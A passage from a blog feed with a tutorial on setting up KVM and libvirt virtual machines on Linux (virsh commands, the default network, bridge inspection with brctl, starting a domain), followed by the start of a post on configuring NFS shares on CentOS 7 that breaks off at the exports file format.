<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
<span class='line-number'>130</span>
<span class='line-number'>131</span>
<span class='line-number'>132</span>
<span class='line-number'>133</span>
<span class='line-number'>134</span>
<span class='line-number'>135</span>
<span class='line-number'>136</span>
<span class='line-number'>137</span>
<span class='line-number'>138</span>
<span class='line-number'>139</span>
<span class='line-number'>140</span>
<span class='line-number'>141</span>
<span class='line-number'>142</span>
<span class='line-number'>143</span>
<span class='line-number'>144</span>
<span class='line-number'>145</span>
<span class='line-number'>146</span>
<span class='line-number'>147</span>
<span class='line-number'>148</span>
<span class='line-number'>149</span>
<span class='line-number'>150</span>
<span class='line-number'>151</span>
<span class='line-number'>152</span>
<span class='line-number'>153</span>
<span class='line-number'>154</span>
<span class='line-number'>155</span>
<span class='line-number'>156</span>
<span class='line-number'>157</span>
<span class='line-number'>158</span>
<span class='line-number'>159</span>
<span class='line-number'>160</span>
<span class='line-number'>161</span>
<span class='line-number'>162</span>
<span class='line-number'>163</span>
<span class='line-number'>164</span>
<span class='line-number'>165</span>
<span class='line-number'>166</span>
<span class='line-number'>167</span>
<span class='line-number'>168</span>
<span class='line-number'>169</span>
<span class='line-number'>170</span>
<span class='line-number'>171</span>
<span class='line-number'>172</span>
<span class='line-number'>173</span>
<span class='line-number'>174</span>
<span class='line-number'>175</span>
<span class='line-number'>176</span>
<span class='line-number'>177</span>
<span class='line-number'>178</span>
<span class='line-number'>179</span>
<span class='line-number'>180</span>
<span class='line-number'>181</span>
<span class='line-number'>182</span>
<span class='line-number'>183</span>
<span class='line-number'>184</span>
<span class='line-number'>185</span>
<span class='line-number'>186</span>
<span class='line-number'>187</span>
<span class='line-number'>188</span>
<span class='line-number'>189</span>
<span class='line-number'>190</span>
<span class='line-number'>191</span>
<span class='line-number'>192</span>
<span class='line-number'>193</span>
<span class='line-number'>194</span>
<span class='line-number'>195</span>
<span class='line-number'>196</span>
<span class='line-number'>197</span>
<span class='line-number'>198</span>
<span class='line-number'>199</span>
<span class='line-number'>200</span>
<span class='line-number'>201</span>
<span class='line-number'>202</span>
<span class='line-number'>203</span>
<span class='line-number'>204</span>
<span class='line-number'>205</span>
<span class='line-number'>206</span>
<span class='line-number'>207</span>
<span class='line-number'>208</span>
<span class='line-number'>209</span>
<span class='line-number'>210</span>
<span class='line-number'>211</span>
<span class='line-number'>212</span>
<span class='line-number'>213</span>
<span class='line-number'>214</span>
<span class='line-number'>215</span>
<span class='line-number'>216</span>
<span class='line-number'>217</span>
<span class='line-number'>218</span>
<span class='line-number'>219</span>
<span class='line-number'>220</span>
<span class='line-number'>221</span>
<span class='line-number'>222</span>
<span class='line-number'>223</span>
<span class='line-number'>224</span>
<span class='line-number'>225</span>
<span class='line-number'>226</span>
<span class='line-number'>227</span>
<span class='line-number'>228</span>
<span class='line-number'>229</span>
<span class='line-number'>230</span>
<span class='line-number'>231</span>
<span class='line-number'>232</span>
<span class='line-number'>233</span>
<span class='line-number'>234</span>
<span class='line-number'>235</span>
<span class='line-number'>236</span>
<span class='line-number'>237</span>
<span class='line-number'>238</span>
<span class='line-number'>239</span>
<span class='line-number'>240</span>
<span class='line-number'>241</span>
<span class='line-number'>242</span>
<span class='line-number'>243</span>
<span class='line-number'>244</span>
<span class='line-number'>245</span>
<span class='line-number'>246</span>
<span class='line-number'>247</span>
<span class='line-number'>248</span>
<span class='line-number'>249</span>
<span class='line-number'>250</span>
<span class='line-number'>251</span>
<span class='line-number'>252</span>
<span class='line-number'>253</span>
<span class='line-number'>254</span>
<span class='line-number'>255</span>
<span class='line-number'>256</span>
<span class='line-number'>257</span>
<span class='line-number'>258</span>
<span class='line-number'>259</span>
<span class='line-number'>260</span>
<span class='line-number'>261</span>
<span class='line-number'>262</span>
<span class='line-number'>263</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>virsh
</span><span class='line'>Welcome to virsh, the virtualization interactive terminal.
</span><span class='line'>
</span><span class='line'>Type:  'help' for help with commands
</span><span class='line'>       'quit' to quit
</span><span class='line'>
</span><span class='line'>virsh # help
</span><span class='line'>Grouped commands:
</span><span class='line'>
</span><span class='line'> Domain Management (help keyword 'domain'):
</span><span class='line'>    attach-device                  attach device from an XML file
</span><span class='line'>    attach-disk                    attach disk device
</span><span class='line'>    attach-interface               attach network interface
</span><span class='line'>    autostart                      autostart a domain
</span><span class='line'>    blkdeviotune                   Set or query a block device I/O tuning parameters.
</span><span class='line'>    blkiotune                      Get or set blkio parameters
</span><span class='line'>    blockcommit                    Start a block commit operation.
</span><span class='line'>    blockcopy                      Start a block copy operation.
</span><span class='line'>    blockjob                       Manage active block operations
</span><span class='line'>    blockpull                      Populate a disk from its backing image.
</span><span class='line'>    blockresize                    Resize block device of domain.
</span><span class='line'>    change-media                   Change media of CD or floppy drive
</span><span class='line'>    console                        connect to the guest console
</span><span class='line'>    cpu-baseline                   compute baseline CPU
</span><span class='line'>    cpu-compare                    compare host CPU with a CPU described by an XML file
</span><span class='line'>    cpu-stats                      show domain cpu statistics
</span><span class='line'>    create                         create a domain from an XML file
</span><span class='line'>    define                         define (but don't start) a domain from an XML file
</span><span class='line'>    desc                           show or set domain's description or title
</span><span class='line'>    destroy                        destroy (stop) a domain
</span><span class='line'>    detach-device                  detach device from an XML file
</span><span class='line'>    detach-disk                    detach disk device
</span><span class='line'>    detach-interface               detach network interface
</span><span class='line'>    domdisplay                     domain display connection URI
</span><span class='line'>    domfsfreeze                    Freeze domain's mounted filesystems.
</span><span class='line'>    domfsthaw                      Thaw domain's mounted filesystems.
</span><span class='line'>    domfsinfo                      Get information of domain's mounted filesystems.
</span><span class='line'>    domfstrim                      Invoke fstrim on domain's mounted filesystems.
</span><span class='line'>    domhostname                    print the domain's hostname
</span><span class='line'>    domid                          convert a domain name or UUID to domain id
</span><span class='line'>    domif-setlink                  set link state of a virtual interface
</span><span class='line'>    domiftune                      get/set parameters of a virtual interface
</span><span class='line'>    domjobabort                    abort active domain job
</span><span class='line'>    domjobinfo                     domain job information
</span><span class='line'>    domname                        convert a domain id or UUID to domain name
</span><span class='line'>    domrename                      rename a domain
</span><span class='line'>    dompmsuspend                   suspend a domain gracefully using power management functions
</span><span class='line'>    dompmwakeup                    wakeup a domain from pmsuspended state
</span><span class='line'>    domuuid                        convert a domain name or id to domain UUID
</span><span class='line'>    domxml-from-native             Convert native config to domain XML
</span><span class='line'>    domxml-to-native               Convert domain XML to native config
</span><span class='line'>    dump                           dump the core of a domain to a file for analysis
</span><span class='line'>    dumpxml                        domain information in XML
</span><span class='line'>    edit                           edit XML configuration for a domain
</span><span class='line'>    event                          Domain Events
</span><span class='line'>    inject-nmi                     Inject NMI to the guest
</span><span class='line'>    iothreadinfo                   view domain IOThreads
</span><span class='line'>    iothreadpin                    control domain IOThread affinity
</span><span class='line'>    iothreadadd                    add an IOThread to the guest domain
</span><span class='line'>    iothreaddel                    delete an IOThread from the guest domain
</span><span class='line'>    send-key                       Send keycodes to the guest
</span><span class='line'>    send-process-signal            Send signals to processes
</span><span class='line'>    lxc-enter-namespace            LXC Guest Enter Namespace
</span><span class='line'>    managedsave                    managed save of a domain state
</span><span class='line'>    managedsave-remove             Remove managed save of a domain
</span><span class='line'>    memtune                        Get or set memory parameters
</span><span class='line'>    perf                           Get or set perf event
</span><span class='line'>    metadata                       show or set domain's custom XML metadata
</span><span class='line'>    migrate                        migrate domain to another host
</span><span class='line'>    migrate-setmaxdowntime         set maximum tolerable downtime
</span><span class='line'>    migrate-compcache              get/set compression cache size
</span><span class='line'>    migrate-setspeed               Set the maximum migration bandwidth
</span><span class='line'>    migrate-getspeed               Get the maximum migration bandwidth
</span><span class='line'>    migrate-postcopy               Switch running migration from pre-copy to post-copy
</span><span class='line'>    numatune                       Get or set numa parameters
</span><span class='line'>    qemu-attach                    QEMU Attach
</span><span class='line'>    qemu-monitor-command           QEMU Monitor Command
</span><span class='line'>    qemu-monitor-event             QEMU Monitor Events
</span><span class='line'>    qemu-agent-command             QEMU Guest Agent Command
</span><span class='line'>    reboot                         reboot a domain
</span><span class='line'>    reset                          reset a domain
</span><span class='line'>    restore                        restore a domain from a saved state in a file
</span><span class='line'>    resume                         resume a domain
</span><span class='line'>    save                           save a domain state to a file
</span><span class='line'>    save-image-define              redefine the XML for a domain's saved state file
</span><span class='line'>    save-image-dumpxml             saved state domain information in XML
</span><span class='line'>    save-image-edit                edit XML for a domain's saved state file
</span><span class='line'>    schedinfo                      show/set scheduler parameters
</span><span class='line'>    screenshot                     take a screenshot of a current domain console and store it into a file
</span><span class='line'>    set-user-password              set the user password inside the domain
</span><span class='line'>    setmaxmem                      change maximum memory limit
</span><span class='line'>    setmem                         change memory allocation
</span><span class='line'>    setvcpus                       change number of virtual CPUs
</span><span class='line'>    shutdown                       gracefully shutdown a domain
</span><span class='line'>    start                          start a (previously defined) inactive domain
</span><span class='line'>    suspend                        suspend a domain
</span><span class='line'>    ttyconsole                     tty console
</span><span class='line'>    undefine                       undefine a domain
</span><span class='line'>    update-device                  update device from an XML file
</span><span class='line'>    vcpucount                      domain vcpu counts
</span><span class='line'>    vcpuinfo                       detailed domain vcpu information
</span><span class='line'>    vcpupin                        control or query domain vcpu affinity
</span><span class='line'>    emulatorpin                    control or query domain emulator affinity
</span><span class='line'>    vncdisplay                     vnc display
</span><span class='line'>    guestvcpus                     query or modify state of vcpu in the guest (via agent)
</span><span class='line'>    setvcpu                        attach/detach vcpu or groups of threads
</span><span class='line'>    domblkthreshold                set the threshold for block-threshold event for a given block device or it's backing chain element
</span><span class='line'>
</span><span class='line'> Domain Monitoring (help keyword 'monitor'):
</span><span class='line'>    domblkerror                    Show errors on block devices
</span><span class='line'>    domblkinfo                     domain block device size information
</span><span class='line'>    domblklist                     list all domain blocks
</span><span class='line'>    domblkstat                     get device block stats for a domain
</span><span class='line'>    domcontrol                     domain control interface state
</span><span class='line'>    domif-getlink                  get link state of a virtual interface
</span><span class='line'>    domifaddr                      Get network interfaces' addresses for a running domain
</span><span class='line'>    domiflist                      list all domain virtual interfaces
</span><span class='line'>    domifstat                      get network interface stats for a domain
</span><span class='line'>    dominfo                        domain information
</span><span class='line'>    dommemstat                     get memory statistics for a domain
</span><span class='line'>    domstate                       domain state
</span><span class='line'>    domstats                       get statistics about one or multiple domains
</span><span class='line'>    domtime                        domain time
</span><span class='line'>    list                           list domains
</span><span class='line'>
</span><span class='line'> Host and Hypervisor (help keyword 'host'):
</span><span class='line'>    allocpages                     Manipulate pages pool size
</span><span class='line'>    capabilities                   capabilities
</span><span class='line'>    cpu-models                     CPU models
</span><span class='line'>    domcapabilities                domain capabilities
</span><span class='line'>    freecell                       NUMA free memory
</span><span class='line'>    freepages                      NUMA free pages
</span><span class='line'>    hostname                       print the hypervisor hostname
</span><span class='line'>    maxvcpus                       connection vcpu maximum
</span><span class='line'>    node-memory-tune               Get or set node memory parameters
</span><span class='line'>    nodecpumap                     node cpu map
</span><span class='line'>    nodecpustats                   Prints cpu stats of the node.
</span><span class='line'>    nodeinfo                       node information
</span><span class='line'>    nodememstats                   Prints memory stats of the node.
</span><span class='line'>    nodesuspend                    suspend the host node for a given time duration
</span><span class='line'>    sysinfo                        print the hypervisor sysinfo
</span><span class='line'>    uri                            print the hypervisor canonical URI
</span><span class='line'>    version                        show version
</span><span class='line'>
</span><span class='line'> Interface (help keyword 'interface'):
</span><span class='line'>    iface-begin                    create a snapshot of current interfaces settings, which can be later committed (iface-commit) or restored (iface-rollback)
</span><span class='line'>    iface-bridge                   create a bridge device and attach an existing network device to it
</span><span class='line'>    iface-commit                   commit changes made since iface-begin and free restore point
</span><span class='line'>    iface-define                   define an inactive persistent physical host interface or modify an existing persistent one from an XML file
</span><span class='line'>    iface-destroy                  destroy a physical host interface (disable it / "if-down")
</span><span class='line'>    iface-dumpxml                  interface information in XML
</span><span class='line'>    iface-edit                     edit XML configuration for a physical host interface
</span><span class='line'>    iface-list                     list physical host interfaces
</span><span class='line'>    iface-mac                      convert an interface name to interface MAC address
</span><span class='line'>    iface-name                     convert an interface MAC address to interface name
</span><span class='line'>    iface-rollback                 rollback to previous saved configuration created via iface-begin
</span><span class='line'>    iface-start                    start a physical host interface (enable it / "if-up")
</span><span class='line'>    iface-unbridge                 undefine a bridge device after detaching its slave device
</span><span class='line'>    iface-undefine                 undefine a physical host interface (remove it from configuration)
</span><span class='line'>
</span><span class='line'> Network Filter (help keyword 'filter'):
</span><span class='line'>    nwfilter-define                define or update a network filter from an XML file
</span><span class='line'>    nwfilter-dumpxml               network filter information in XML
</span><span class='line'>    nwfilter-edit                  edit XML configuration for a network filter
</span><span class='line'>    nwfilter-list                  list network filters
</span><span class='line'>    nwfilter-undefine              undefine a network filter
</span><span class='line'>
</span><span class='line'> Networking (help keyword 'network'):
</span><span class='line'>    net-autostart                  autostart a network
</span><span class='line'>    net-create                     create a network from an XML file
</span><span class='line'>    net-define                     define an inactive persistent virtual network or modify an existing persistent one from an XML file
</span><span class='line'>    net-destroy                    destroy (stop) a network
</span><span class='line'>    net-dhcp-leases                print lease info for a given network
</span><span class='line'>    net-dumpxml                    network information in XML
</span><span class='line'>    net-edit                       edit XML configuration for a network
</span><span class='line'>    net-event                      Network Events
</span><span class='line'>    net-info                       network information
</span><span class='line'>    net-list                       list networks
</span><span class='line'>    net-name                       convert a network UUID to network name
</span><span class='line'>    net-start                      start a (previously defined) inactive network
</span><span class='line'>    net-undefine                   undefine a persistent network
</span><span class='line'>    net-update                     update parts of an existing network's configuration
</span><span class='line'>    net-uuid                       convert a network name to network UUID
</span><span class='line'>
</span><span class='line'> Node Device (help keyword 'nodedev'):
</span><span class='line'>    nodedev-create                 create a device defined by an XML file on the node
</span><span class='line'>    nodedev-destroy                destroy (stop) a device on the node
</span><span class='line'>    nodedev-detach                 detach node device from its device driver
</span><span class='line'>    nodedev-dumpxml                node device details in XML
</span><span class='line'>    nodedev-list                   enumerate devices on this host
</span><span class='line'>    nodedev-reattach               reattach node device to its device driver
</span><span class='line'>    nodedev-reset                  reset node device
</span><span class='line'>    nodedev-event                  Node Device Events
</span><span class='line'>
</span><span class='line'> Secret (help keyword 'secret'):
</span><span class='line'>    secret-define                  define or modify a secret from an XML file
</span><span class='line'>    secret-dumpxml                 secret attributes in XML
</span><span class='line'>    secret-event                   Secret Events
</span><span class='line'>    secret-get-value               Output a secret value
</span><span class='line'>    secret-list                    list secrets
</span><span class='line'>    secret-set-value               set a secret value
</span><span class='line'>    secret-undefine                undefine a secret
</span><span class='line'>
</span><span class='line'> Snapshot (help keyword 'snapshot'):
</span><span class='line'>    snapshot-create                Create a snapshot from XML
</span><span class='line'>    snapshot-create-as             Create a snapshot from a set of args
</span><span class='line'>    snapshot-current               Get or set the current snapshot
</span><span class='line'>    snapshot-delete                Delete a domain snapshot
</span><span class='line'>    snapshot-dumpxml               Dump XML for a domain snapshot
</span><span class='line'>    snapshot-edit                  edit XML for a snapshot
</span><span class='line'>    snapshot-info                  snapshot information
</span><span class='line'>    snapshot-list                  List snapshots for a domain
</span><span class='line'>    snapshot-parent                Get the name of the parent of a snapshot
</span><span class='line'>    snapshot-revert                Revert a domain to a snapshot
</span><span class='line'>
</span><span class='line'> Storage Pool (help keyword 'pool'):
</span><span class='line'>    find-storage-pool-sources-as   find potential storage pool sources
</span><span class='line'>    find-storage-pool-sources      discover potential storage pool sources
</span><span class='line'>    pool-autostart                 autostart a pool
</span><span class='line'>    pool-build                     build a pool
</span><span class='line'>    pool-create-as                 create a pool from a set of args
</span><span class='line'>    pool-create                    create a pool from an XML file
</span><span class='line'>    pool-define-as                 define a pool from a set of args
</span><span class='line'>    pool-define                    define an inactive persistent storage pool or modify an existing persistent one from an XML file
</span><span class='line'>    pool-delete                    delete a pool
</span><span class='line'>    pool-destroy                   destroy (stop) a pool
</span><span class='line'>    pool-dumpxml                   pool information in XML
</span><span class='line'>    pool-edit                      edit XML configuration for a storage pool
</span><span class='line'>    pool-info                      storage pool information
</span><span class='line'>    pool-list                      list pools
</span><span class='line'>    pool-name                      convert a pool UUID to pool name
</span><span class='line'>    pool-refresh                   refresh a pool
</span><span class='line'>    pool-start                     start a (previously defined) inactive pool
</span><span class='line'>    pool-undefine                  undefine an inactive pool
</span><span class='line'>    pool-uuid                      convert a pool name to pool UUID
</span><span class='line'>    pool-event                     Storage Pool Events
</span><span class='line'>
</span><span class='line'> Storage Volume (help keyword 'volume'):
</span><span class='line'>    vol-clone                      clone a volume.
</span><span class='line'>    vol-create-as                  create a volume from a set of args
</span><span class='line'>    vol-create                     create a vol from an XML file
</span><span class='line'>    vol-create-from                create a vol, using another volume as input
</span><span class='line'>    vol-delete                     delete a vol
</span><span class='line'>    vol-download                   download volume contents to a file
</span><span class='line'>    vol-dumpxml                    vol information in XML
</span><span class='line'>    vol-info                       storage vol information
</span><span class='line'>    vol-key                        returns the volume key for a given volume name or path
</span><span class='line'>    vol-list                       list vols
</span><span class='line'>    vol-name                       returns the volume name for a given volume key or path
</span><span class='line'>    vol-path                       returns the volume path for a given volume name or key
</span><span class='line'>    vol-pool                       returns the storage pool for a given volume key or path
</span><span class='line'>    vol-resize                     resize a vol
</span><span class='line'>    vol-upload                     upload file contents to a volume
</span><span class='line'>    vol-wipe                       wipe a vol
</span><span class='line'>
</span><span class='line'> Virsh itself (help keyword 'virsh'):
</span><span class='line'>    cd                             change the current directory
</span><span class='line'>    echo                           echo arguments
</span><span class='line'>    exit                           quit this interactive terminal
</span><span class='line'>    help                           print help
</span><span class='line'>    pwd                            print the current directory
</span><span class='line'>    quit                           quit this interactive terminal
</span><span class='line'>    connect                        (re)connect to hypervisor</span></code></pre></td></tr></table></div></figure>


<p>Ok, default network check now:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>virsh net-list --all
</span><span class='line'> Name                 State      Autostart     Persistent
</span><span class='line'>----------------------------------------------------------
</span><span class='line'> default              inactive   no            yes</span></code></pre></td></tr></table></div></figure>


<p>The default network is inactive, so we have to enable it:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>virsh net-start default
</span><span class='line'>Network default started</span></code></pre></td></tr></table></div></figure>


<p>Now, if you do an <em>ifconfig</em>, you should see the new bridge interface:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>virbr0: flags=4099&lt;UP,BROADCAST,MULTICAST&gt;  mtu 1500
</span><span class='line'>        inet 192.168.122.1  netmask 255.255.255.0  broadcast 192.168.122.255
</span><span class='line'>        ether 52:54:00:b2:a7:6e  txqueuelen 1000  (Ethernet)
</span><span class='line'>        RX packets 0  bytes 0 (0.0 B)
</span><span class='line'>        RX errors 0  dropped 0  overruns 0  frame 0
</span><span class='line'>        TX packets 0  bytes 0 (0.0 B)
</span><span class='line'>        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span></code></pre></td></tr></table></div></figure>


<p>To get more info about your bridge, you can use the <strong>brctl</strong> command:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>brctl
</span><span class='line'>Usage: brctl [commands]
</span><span class='line'>commands:
</span><span class='line'>  addbr       &lt;bridge&gt;      add bridge
</span><span class='line'>  delbr       &lt;bridge&gt;      delete bridge
</span><span class='line'>  addif       &lt;bridge&gt; &lt;device&gt;   add interface to bridge
</span><span class='line'>  delif       &lt;bridge&gt; &lt;device&gt;   delete interface from bridge
</span><span class='line'>  hairpin     &lt;bridge&gt; &lt;port&gt; {on|off}    turn hairpin on/off
</span><span class='line'>  setageing   &lt;bridge&gt; &lt;time&gt;     set ageing time
</span><span class='line'>  setbridgeprio   &lt;bridge&gt; &lt;prio&gt;     set bridge priority
</span><span class='line'>  setfd       &lt;bridge&gt; &lt;time&gt;     set bridge forward delay
</span><span class='line'>  sethello    &lt;bridge&gt; &lt;time&gt;     set hello time
</span><span class='line'>  setmaxage   &lt;bridge&gt; &lt;time&gt;     set max message age
</span><span class='line'>  setpathcost &lt;bridge&gt; &lt;port&gt; &lt;cost&gt;    set path cost
</span><span class='line'>  setportprio &lt;bridge&gt; &lt;port&gt; &lt;prio&gt;    set port priority
</span><span class='line'>  show        [ &lt;bridge&gt; ]      show a list of bridges
</span><span class='line'>  showmacs    &lt;bridge&gt;      show a list of mac addrs
</span><span class='line'>  showstp     &lt;bridge&gt;      show bridge stp info
</span><span class='line'>  stp         &lt;bridge&gt; {on|off} turn stp on/off</span></code></pre></td></tr></table></div></figure>


<blockquote><p>brctl is used to set up, maintain, and inspect the ethernet bridge configuration in the linux kernel.</p>

<p>An ethernet bridge is a device commonly used to connect different  networks of ethernets together, so that these
ethernets will appear as one ethernet to the participants.</p>

<p>Each of the ethernets  being  connected  corresponds  to  one  physical interface  in  the  bridge. These individual
ethernets are bundled into one bigger (&lsquo;logical&rsquo;) ethernet, this bigger  ethernet  corresponds  to the bridge
network interface.</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>brctl show
</span><span class='line'>bridge name   bridge id       STP enabled interfaces
</span><span class='line'>virbr0        8000.525400b2a76e   yes     virbr0-nic</span></code></pre></td></tr></table></div></figure>


<p>Ok, now we have the default network set. It&rsquo;s time to actually start some VMs. In KVM, VMs can be managed both from the command line with virsh, and from the GUI, with Virtual Network Manager, which you can find under System Tools.</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/kvm/virtmanager.png" title="virtmanager" alt="virtmanager"></p>

<p><strong>Before starting to create VMs, please reboot your host to save you time and headaches</strong>.</p>

<p>I grabbed a Debian iso to showcase its live CD, and I created a VM from it:</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/kvm/1-new.png" title="new vm" alt="new vm"></p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/kvm/2-os.png" title="os" alt="os"></p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/kvm/3-hw.png" title="hardware" alt="hardware specs"></p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/kvm/4-space.png" title="disk" alt="disk"></p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/kvm/5-final.png" title="create vm" alt="create vm"></p>

<p>I had to do one more step before getting rid of errors every time I finished with the VM creation. libvirt was pointing to the qemu-kvm binary, but I had no such file, so I created a symlink as specified in this <a href="https://bbs.archlinux.org/viewtopic.php?pid=1240205#p1240205">Arch Linux forum</a>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ln -s /usr/bin/qemu-{system-x86_64,kvm}
</span><span class='line'>ls -la /usr/bin/qemu-kvm
</span><span class='line'>lrwxrwxrwx 1 root root 27 Sep 17 13:19 /usr/bin/qemu-kvm -&gt; /usr/bin/qemu-system-x86_64</span></code></pre></td></tr></table></div></figure>


<p><img class="center" src="http://chousensha.github.io/images/sysadmin/kvm/vm.png" title="vm" alt="working vm"></p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/kvm/details.png" title="vm details" alt="vm details"></p>

<p>KVM graphical interface is nice, but we are not limited to a GUI. We can create and interact with VMs from the command line!</p>

<p>First, let&rsquo;s see if what VMs we&rsquo;ve got:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>virsh list --all
</span><span class='line'> Id    Name                           State
</span><span class='line'>----------------------------------------------------
</span><span class='line'> -     generic                        shut off</span></code></pre></td></tr></table></div></figure>


<p>If we only wanted to list the running VMs, we could do it with <code>virsh list</code></p>

<p>Now, I&rsquo;m going to start a VM, which in virsh talk is called a domain, and look at some info about it:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>virsh # start generic
</span><span class='line'>Domain generic started
</span><span class='line'>
</span><span class='line'>virsh # dominfo generic
</span><span class='line'>Id:             1
</span><span class='line'>Name:           generic
</span><span class='line'>UUID:           c4982e35-ec8d-4b5f-9ad3-c8491bcd9181
</span><span class='line'>OS Type:        hvm
</span><span class='line'>State:          running
</span><span class='line'>CPU(s):         1
</span><span class='line'>CPU time:       0.4s
</span><span class='line'>Max memory:     1048576 KiB
</span><span class='line'>Used memory:    1048576 KiB
</span><span class='line'>Persistent:     yes
</span><span class='line'>Autostart:      disable
</span><span class='line'>Managed save:   no
</span><span class='line'>Security model: none
</span><span class='line'>Security DOI:   0</span></code></pre></td></tr></table></div></figure>


<p>Now we have a better grasp on Linux-based hypervisors, and we don&rsquo;t have to rely on VMware and Virtualbox only. In a future post I will show how to install a VM from the command line.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> ______________________________________
</span><span class='line'>/ Q: How did you get into artificial   \
</span><span class='line'>| intelligence? A: Seemed logical -- I |
</span><span class='line'>\ didn't have any real intelligence.   /
</span><span class='line'> --------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[NFS shares on CentOS 7]]></title>
    <link href="http://chousensha.github.io/blog/2017/09/10/nfs-shares-on-centos-7/"/>
    <updated>2017-09-10T07:45:30-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/09/10/nfs-shares-on-centos-7</id>
    <content type="html"><![CDATA[<p>Today we will go over an alternate way of setting up shares on CentOS 7. In an <a href="https://chousensha.github.io/blog/2017/06/09/quick-shares-with-samba-on-centos/">earlier post</a> we saw how we can share stuff with Samba, which is the preferred way, especially if you have mixed environments. But today I also wanted to go through the process using the veteran: NFS! For this example, we&rsquo;ll be looking at the newest version, NFS4, which adds performance and security features, but also operates a little bit differently than its predecessors.</p>

<!-- more -->


<p>The Network File System allows clients to mount remote filesystems as if they were present locally. By default, the NFS server is listening on port 2049. In version 4, NFS requires the use of TCP.</p>

<h3>Server configuration</h3>

<p>If you don&rsquo;t have it already, install the <code>nfs-utils</code> package. Next, start NFS with the command: <code>systemctl start nfs</code>. For the share, I created some directory and put a file in it:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mkdir /var/nfs-share
</span><span class='line'>chmod 777 /var/nfs-share/</span></code></pre></td></tr></table></div></figure>


<p>Now we have to edit the <code>/etc/exports</code> file, which contains the configuration for the shares. The format is as follows:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
